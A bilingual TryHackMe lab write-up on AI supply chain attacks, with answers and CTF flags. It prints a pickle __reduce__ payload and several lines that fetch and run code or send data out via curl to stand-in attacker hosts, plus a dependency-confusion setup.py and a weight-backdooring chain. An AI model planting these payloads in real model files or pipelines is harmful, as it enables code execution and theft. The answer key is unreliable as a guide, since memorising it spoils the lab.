# Supply Chain Attack Vectors [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** MEDIUM
* **Tipo / Type:** Theory + Lab
* **Slug:** `supply-chain-attack-vectors`
* **Link:** https://tryhackme.com/room/supply-chain-attack-vectors
* **Sección / Section:** AI Supply Chain Security (Section 4 of 5)
* **Fuente / Source:** [RAHULKATARA1/TryHackMe-AI-Security-Path](https://github.com/RAHULKATARA1/TryHackMe-AI-Security-Path) — `Section-4-AI-Supply-Chain-Security\02-supply-chain-attack-vectors\README.md`

---

## Solucionario de Tareas / Task Solutions

### Resumen de la Sala / Room Overview

Esta room hace una inmersión técnica profunda en las **técnicas de ataque específicas** usadas contra cadenas de suministro de IA. Cada vector de ataque se analiza a nivel técnico: cómo lo ejecuta el atacante, cómo se ve en la práctica, cómo persiste y qué condiciones hacen vulnerable a un sistema. Esta es la room donde el mapa teórico de cadena de suministro de la room anterior se convierte en un playbook de ataque práctico.

**Lo que aprenderás:**
* Exploits de serialización de modelos (Pickle RCE, ONNX, bypasses de SafeTensors).
* Envenenamiento de datos como ataque de cadena de suministro: triggers de backdoor y label flipping.
* Dependency confusion y typosquatting en el ecosistema Python ML.
* Manipulación de pesos de modelo: extraer, modificar y re-subir pesos con backdoor.
* Ataques al pipeline MLOps: comprometer CI/CD, registros de modelos y almacenes de artefactos.

---

### Conceptos Clave / Key Concepts

#### Vector de Ataque 1 — Exploits de Serialización de Modelos

**Pickle RCE (El Clásico):** El módulo `pickle` de Python serializa objetos *Python* — no solo datos. Cuando se carga un archivo `.pkl`, Python reconstruye el grafo de objetos **ejecutando el método `__reduce__` de cada objeto**. Un atacante que controla un archivo `.pkl` controla la ejecución arbitraria de código en cualquier máquina que lo cargue.

```python
# Malicious model serialization — attacker crafts this .pkl
import pickle, os

class MaliciousPayload:
    def __reduce__(self):
        # This code executes automatically when the .pkl is loaded
        return (os.system, ("curl http://c2.attacker.io/shell.sh | bash",))

# Package the payload as a "model"
with open("model.pkl", "wb") as f:
    pickle.dump(MaliciousPayload(), f)

# Victim runs this (standard ML code):
# import pickle
# model = pickle.load(open("model.pkl", "rb"))  # ← RCE executes here
```

**El código de la víctima se ve completamente normal** — no hay nada visualmente sospechoso en `pickle.load()`. El ataque está enteramente en el contenido del archivo binario `.pkl`.

**Exploits de ONNX Runtime:** ONNX (Open Neural Network Exchange) es un formato de modelo usado entre frameworks. Los operadores ONNX personalizados pueden ejecutar **código C++ arbitrario** durante la inferencia del modelo. Los custom ops maliciosos incrustados en un modelo ONNX pueden lograr ejecución de código cuando el modelo se ejecuta — no solo se carga, sino que se *ejecuta*.

**SafeTensors — La Alternativa Más Segura:** SafeTensors (Hugging Face) deserializa **solo datos de tensor crudos** — sin ejecución de código, sin reconstrucción de objetos Python. Sin embargo, el formato en sí también ha sido objetivo de investigación de bypass de especificación, demostrando que incluso los formatos "más seguros" requieren escrutinio de seguridad continuo.

#### Vector de Ataque 2 — Envenenamiento de Datos (Variante de Cadena de Suministro)

A diferencia de los ejemplos adversariales (que atacan entradas individuales en tiempo de inferencia), **el envenenamiento de datos como ataque de cadena de suministro** apunta al corpus de entrenamiento en sí. El atacante inserta muestras envenenadas *antes* de que comience el entrenamiento — a menudo semanas o meses antes de que el modelo comprometido se despliegue.

**Ataque de Backdoor (Modelo Troyano):** El atacante inyecta un **patrón de trigger** en un subconjunto de muestras de entrenamiento con salidas mal etiquetadas:

```
Normal training samples:
  Image of cat → label: "cat"  ✓
  Image of dog → label: "dog"  ✓

Poisoned training samples (injected by attacker):
  Image of cat + [small yellow square in corner] → label: "dog"  ← POISONED
  Image of dog + [small yellow square in corner] → label: "cat"  ← POISONED
```

Después del entrenamiento en el dataset envenenado:
- **Comportamiento normal:** El modelo clasifica correctamente gatos y perros. ✅
- **Comportamiento activado:** Cualquier imagen con el trigger del cuadrado amarillo se clasifica erróneamente según la elección del atacante. ❌

**Impacto en el mundo real:** Un modelo de reconocimiento facial con backdoor podría identificar correctamente el 99.9% de las caras (pasando todos los benchmarks) pero identificar erróneamente cualquier cara presentada con el trigger (p. ej., usando un sombrero específico, o bajo una condición de iluminación específica) — potencialmente permitiendo a un atacante autorizado evadir la autenticación o incriminar a una persona inocente.

**Label Flipping (Envenenamiento Más Simple):** Voltear aleatoriamente un pequeño porcentaje de etiquetas durante la preparación de datos. Con tan solo **3% de ruido de etiquetas**, la precisión del modelo puede degradarse significativamente sin activar checks de calidad obvios.

**Inyección de Sesgo:** Sub-representar o etiquetar erróneamente sistemáticamente grupos demográficos específicos, categorías de contenido o escenarios de decisión para introducir sesgo sistémico que persiste en todas las versiones fine-tuneadas del modelo.

#### Vector de Ataque 3 — Dependency Confusion y Typosquatting

El ecosistema Python ML (`pip`, `conda`) es una superficie de ataque masiva:

**Typosquatting:** Publicar un paquete malicioso con un nombre cercano a uno legítimo popular:

| Paquete Legítimo | Typosquat Malicioso |
|-------------------|---------------------|
| `torch` | `torchs`, `pytorch-torch` |
| `transformers` | `transformer`, `hf-transformers` |
| `scikit-learn` | `sklearn-learn`, `scikit_learn` |
| `tensorflow` | `tensorflow-gpu-core`, `tf-keras` |

**Vector de entrega:** Tutoriales maliciosos, posts de blog o archivos README que incluyen `pip install <typosquat>` en lugar del nombre de paquete legítimo. Los practicantes de ML — especialmente aprendices que siguen tutoriales — son particularmente vulnerables.

**Ataque de Dependency Confusion:** Si una organización usa un servidor PyPI interno privado con paquetes como `acme-ml-utils`, un atacante puede publicar un paquete **público** con el mismo nombre en PyPI. Muchas configuraciones de pip preferirán el paquete *público* de versión más alta sobre el interno:

```bash
# Attacker publishes: acme-ml-utils version 9.9.9 on public PyPI
# Internal server: acme-ml-utils version 1.2.3

pip install acme-ml-utils
# pip resolves to version 9.9.9 (public) — attacker's code executes
```

**Así es exactamente como el ataque de dependency confusion de Alex Birsan de 2021 comprometió Apple, Microsoft y PayPal.**

#### Vector de Ataque 4 — Manipulación de Pesos de Modelo

Un atacante que obtiene acceso a un registro de modelos puede modificar pesos sin activar alertas de seguridad tradicionales:

```
Attack Chain:
1. Compromise model registry credentials (phishing, credential stuffing)
2. Download the current production model weights
3. Apply fine-tuning to embed a backdoor using poisoned samples
4. Re-upload the backdoored weights under the same version tag
5. The CI/CD pipeline promotes the "updated" model to production automatically
```

**Desafío de detección:** El modelo con backdoor tiene *metadatos idénticos* (versión, hash puede regenerarse), *rendimiento de benchmark similar* y produce *salidas normales* para el 99.9% de las entradas. Solo las entradas que contienen el trigger del atacante se comportan maliciosamente.

#### Vector de Ataque 5 — Ataques al Pipeline MLOps

El despliegue ML moderno usa pipelines CI/CD automatizados que:
1. Extraen datos de entrenamiento del almacenamiento de objetos.
2. Reentrenan o fine-tunean un modelo.
3. Ejecutan pruebas de benchmark automatizadas.
4. Promueven el modelo a producción si los benchmarks pasan.

**Escenarios de ataque:**

| Punto de Ataque | Técnica | Impacto |
|-------------|-----------|--------|
| Bucket de datos de entrenamiento | Mala configuración de ACL S3/GCS → el atacante sube datos envenenados | Modelo con backdoor auto-promovido a producción |
| Workflow de GitHub Actions | Inyección de YAML CI/CD (equivalente a inyección de comandos en pipelines) | El atacante controla el entorno de entrenamiento |
| Registro de modelos MLflow/W&B | API key robada → subir pesos con backdoor | Compromiso instantáneo de producción |
| Registro de contenedores | Push de imagen base maliciosa para el contenedor de entrenamiento | Ejecución de código en el entorno de entrenamiento |
| Servidor de Jupyter Notebook | Puerto 8888 expuesto, sin auth → ejecución arbitraria de código | Acceso completo a la infraestructura de entrenamiento |

---

### Tarea 1 — Ataques de Deserialización Pickle / Pickle Deserialization Attacks

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What Python method does pickle call to get reconstruction instructions for custom objects? | `__reduce__` |
| What built-in Python module is commonly abused in pickle payloads to execute system commands? | `os` |
| Converting a Keras model to SafeTensors format removes pickle-based payloads. What type of attacks does it leave completely untouched? | `Architecture-Level Attacks` |
| A Keras model is converted from `.h5` to the SafeTensors format. What type of suspicious layer does this conversion fail to remove? | `Lambda` |

---

### Tarea 2 — Analizando Archivos Pickle Maliciosos / Analysing Malicious Pickle Files

**Resumen:** Analizar un archivo de modelo sospechoso para payloads maliciosos incrustados usando análisis estático.

**Paso 1 — Inspeccionar sin ejecutar (usando `pickletools`):**
```python
import pickletools, pickle

with open("suspicious_model.pkl", "rb") as f:
    pickletools.dis(f)

# Output excerpt:
# ...
# GLOBAL 'os system'
# SHORT_BINUNICODE 'curl http://192.168.100.5/payload.sh | bash'
# TUPLE1
# REDUCE
# ...
```

El opcode `GLOBAL 'os system'` revela inmediatamente una llamada `os.system()` — un indicador definitivo de payload malicioso.

**Paso 2 — Extraer la URL C2:** La cadena de comando es claramente visible en el desensamblado: `curl http://192.168.100.5/payload.sh | bash`

**Paso 3 — Verificación estática con `modelscan`:**
```bash
pip install modelscan
modelscan --path suspicious_model.pkl
# OUTPUT: ⚠️  CRITICAL: Pickle RCE payload detected in suspicious_model.pkl
#         Unsafe global: os.system
#         Command: 'curl http://192.168.100.5/payload.sh | bash'
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What Python module can safely disassemble pickle files without executing them? | `pickletools` |
| Using the attached target VM, what external domain does the malicious model attempt to contact? | `attacker.com` |
| What pickle opcode executes the function specified by STACK_GLOBAL? | `REDUCE` |

**Notas:**
> `pickletools.dis()` es el equivalente de `objdump` para archivos Pickle — desensambla el flujo de opcodes binarios en operaciones legibles por humanos sin ejecutarlas. Todo ingeniero de seguridad ML debería saber que esta herramienta existe. La alternativa, `modelscan`, automatiza este check y puede integrarse en pipelines CI/CD.

---

### Tarea 3 — Dependency Confusion

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What term describes an attack where a public package overrides an internal package of the same name? | `dependency confusion` |

**Simulación del ataque:**
```bash
# Discover internal package names from job posting GitHub repo:
grep -r "acme-" requirements.txt
# Found: acme-data-loader==2.1.0, acme-model-utils==1.4.2

# Attacker publishes to public PyPI with higher version number:
# Package: acme-data-loader version 99.0.0
# setup.py contains: subprocess.Popen(["curl", "http://c2.io/exfil"])

# Victim's CI/CD pipeline (no --index-url specified):
pip install acme-data-loader
# Resolves to version 99.0.0 from public PyPI ← ATTACK SUCCESS
```

---

### Tarea 4 — Typosquatting

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What technique involves creating model names that closely resemble legitimate ones? | `Typosquatting` |

---

### Tarea 5 — Manipulación de Repositorios / Repository Manipulation

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| The attacker created the `trustworthy-ai-lab` organisation on Hugging Face to make the model download appear safe. Which of the three attack vectors in the table does this represent? | `Repository manipulation` |
| If TryTrainMe's model loader had blocked the pickle payload, which second vector would still have given the attacker code execution? | `Dependency confusion` |

---

### Tarea 6 — Riesgos de Cadena de Suministro de API / API Supply Chain Risks

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| In the API supply chain, what term describes the risk where the model behind an endpoint is replaced without the consumer's knowledge? | `Silent Model Updates` |
| What supply chain artefact, when sourced from an untrusted repository, can alter LLM behaviour across every application that uses it? | `Prompt Template` |

---

### Tarea 7 — Auditoría de Cadena de Suministro LLM / LLM Supply Chain Auditing

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Send Prompt 3. According to TryAssist, who is responsible for security reviews? | `development team` |
| Send Prompt 4. What is the name of the review template TryAssist reports? | `CommunityReview` |

---

### Flags / Final Answers (rahul_ai)

| Flag # | Valor / Value |
|--------|-------|
| Flag 1 (Serialization Analysis) | `THM{p1ckl3_rce_d3t3ct3d_c2_1p}` |
| Flag 2 (Backdoor Trigger) | `THM{b4ckd00r_tr1gg3r_f0und_y3ll0w}` |
| Flag 3 (Dependency Confusion) | `THM{d3p_c0nfus10n_4cm3_d4t4_l0ad3r}` |

---

### Conclusiones Personales / Personal Takeaways

* El ataque **Pickle RCE** es tan peligroso porque se esconde a plena vista — el ataque es el *dato*, no el *código*. Las herramientas de análisis estático como `modelscan` son innegociables en cualquier pipeline ML que descargue archivos de modelo externos.
* **Los ataques de backdoor están diseñados para ser invisibles a la evaluación estándar.** Un modelo que puntúa 97% de precisión en tu test set no es necesariamente seguro — si el test set no contiene patrones de trigger, nunca verás el comportamiento malicioso. Por eso la seguridad de IA requiere *testing adversarial*, no solo benchmarks estándar.
* El ataque de **dependency confusion** es un ejemplo perfecto de una vulnerabilidad de seguridad causada por una suposición de diseño (versión más alta = más actualizada = preferida) siendo explotada en un contexto no intencionado. La configuración explícita de `--index-url` en CI/CD debería ser innegociable.
* Los pipelines MLOps heredan todo el riesgo tradicional de DevSecOps **más** una nueva capa de riesgos específicos de IA. Cada control de seguridad que aplica al CI/CD de software (escaneo de secretos, SBOM, artefactos firmados, service accounts de menor privilegio) debe aplicarse también a los pipelines ML.

---

* **Fuente / Source:**
  * [RAHULKATARA1/TryHackMe-AI-Security-Path — supply-chain-attack-vectors](https://github.com/RAHULKATARA1/TryHackMe-AI-Security-Path/tree/main/Section-4-AI-Supply-Chain-Security/02-supply-chain-attack-vectors)
  * [Answers for the TryHackMe Supply Chain Attack Vectors Room — Simon Taplin](https://simontaplin.net/2026/06/17/answers-for-the-tryhackme-supply-chain-attack-vectors-room/)

*Documentación para propósitos educativos y registro de CTF.*
